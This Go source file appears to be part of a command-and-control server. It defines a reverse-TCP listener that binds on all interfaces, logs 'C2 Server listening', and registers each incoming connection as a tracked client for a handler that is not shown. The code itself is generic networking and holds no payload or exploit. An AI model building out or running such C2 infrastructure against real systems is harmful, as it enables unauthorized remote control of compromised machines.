package network

import (
	"backend/models"
	"backend/utils"
	"fmt"
	"log"
	"net"
	"sync"
	"time"
)

var (
	isListening   bool
	listenerMutex sync.Mutex
	currentPort   int
)

func StartReverseTCPListener(port int) {
	listenerMutex.Lock()
	isListening = true
	currentPort = port
	listenerMutex.Unlock()

	defer func() {
		listenerMutex.Lock()
		isListening = false
		currentPort = 0
		listenerMutex.Unlock()
	}()

	address := fmt.Sprintf("0.0.0.0:%d", port)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Printf("Failed to start listener: %v", err)
		return
	}
	defer listener.Close()

	log.Printf("C2 Server listening on port %d", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}

		clientAddr := conn.RemoteAddr().String()
		client := &models.Client{
			ID:        utils.GenerateClientID(),
			Conn:      conn,
			LastSeen:  time.Now(),
			IPAddress: clientAddr,
			IsActive:  true,
			Messages:  make([]models.ClientMessage, 0),
		}

		log.Printf("New client connected: %s from %s", client.ID, clientAddr)

		// Store the client
		AddClient(clientAddr, client)

		// Handle client using binary protocol
		go handleClientConnection(client)
	}
}

func IsListening() bool {
	listenerMutex.Lock()
	defer listenerMutex.Unlock()
	return isListening
}
